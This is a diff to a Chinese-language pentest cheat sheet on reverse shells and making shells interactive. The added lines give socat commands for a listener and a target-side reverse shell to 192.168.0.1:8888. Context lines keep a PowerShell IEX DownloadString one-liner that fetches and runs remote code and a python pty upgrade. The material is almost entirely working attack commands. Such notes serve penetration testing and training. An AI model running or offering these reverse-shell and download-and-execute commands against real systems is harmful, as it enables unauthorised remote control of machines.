@@ -1,4 +1,4 @@
-# 反弹shell & 提升shell交互式
+# 反弹shell & 升级交互式shell
 
 ## 0x01 反弹shell
 
@@ -38,4 +38,18 @@ powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadS
 它可以执行命令su，以为他们是在一个合适的终端执行。要升级一个shell，只需运行以下命令：     
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
+
 ```
+#### socat(反弹交互式shell)
+本机监听(192.168.0.1):   
+```
+socat file:`tty`,raw,echo=0 tcp-listen:8888
+```
+目标主机:   
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.1:8888   
+```
+如果没有安装socat。有独立的二进制文件可以从这个Github下载：https://github.com/andrew-d/static-binaries    
+
+## Ref 
+- [将简单的shell升级为完全交互式的TTY](https://www.4hou.com/posts/mQ7R)
